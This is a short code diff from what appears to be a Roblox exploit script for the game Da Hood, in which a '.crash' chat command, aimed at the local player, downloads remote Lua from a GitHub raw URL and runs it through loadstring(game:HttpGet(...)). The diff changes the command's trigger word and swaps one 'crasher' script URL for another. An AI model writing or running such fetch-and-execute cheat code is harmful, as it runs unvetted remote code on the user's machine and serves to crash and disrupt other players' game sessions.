@@ -474,7 +474,7 @@ local function Initiate()
 					wait(1)
 					setfpscap(60)	
 				end
-			elseif Args[1] == ".crash" and Args[2] == "15min" and not Crashed then
+			elseif Args[1] == ".crash" and Args[2] == "main" and not Crashed then
 				local Player = GetPlayerFromString(Args[3],true)
 				if Player and Player == game.Players.LocalPlayer then
 					if game.CoreGui:FindFirstChild("RenderScreen") then
@@ -482,7 +482,7 @@ local function Initiate()
 					end
 					game:GetService("RunService"):Set3dRenderingEnabled(true)
 					Crashed = true
-					loadstring(game:HttpGet("https://raw.githubusercontent.com/remorseW/encryptW/main/DahooSuperQuickCrash.lua"))()
+					loadstring(game:HttpGet('https://raw.githubusercontent.com/BetterDaHood/BetterDaHoodCrasher/main/Crash'))()
 
 					for Index,Var in pairs(CmdSettings) do
 						CmdSettings[Var] = nil
